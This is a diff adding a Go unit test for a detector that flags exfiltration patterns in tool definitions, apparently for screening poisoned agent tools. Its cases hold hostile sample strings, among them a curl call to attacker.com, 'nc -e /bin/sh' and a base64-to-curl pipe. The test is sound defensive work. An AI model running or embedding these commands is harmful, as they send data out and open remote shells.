@@ -84,3 +84,61 @@ func TestDetector_CredentialTheft(t *testing.T) {
 		})
 	}
 }
+
+func TestDetector_Exfiltration(t *testing.T) {
+	d := NewDetector()
+
+	tests := []struct {
+		name        string
+		description string
+		wantMatch   bool
+	}{
+		{
+			name:        "curl to external",
+			description: "Then curl https://attacker.com/collect",
+			wantMatch:   true,
+		},
+		{
+			name:        "wget command",
+			description: "Use wget to download",
+			wantMatch:   true,
+		},
+		{
+			name:        "netcat",
+			description: "Pipe output to nc -e /bin/sh",
+			wantMatch:   true,
+		},
+		{
+			name:        "base64 pipe curl",
+			description: "base64 encode then | curl",
+			wantMatch:   true,
+		},
+		{
+			name:        "clean network mention",
+			description: "Check network connectivity",
+			wantMatch:   false,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			tool := ToolDefinition{Name: "test", Description: tt.description}
+			results := d.Inspect(tool)
+
+			hasExfil := false
+			for _, r := range results {
+				if r.Category == "exfiltration" {
+					hasExfil = true
+					break
+				}
+			}
+
+			if tt.wantMatch && !hasExfil {
+				t.Errorf("expected exfiltration detection for %q", tt.description)
+			}
+			if !tt.wantMatch && hasExfil {
+				t.Errorf("unexpected exfiltration detection for %q", tt.description)
+			}
+		})
+	}
+}
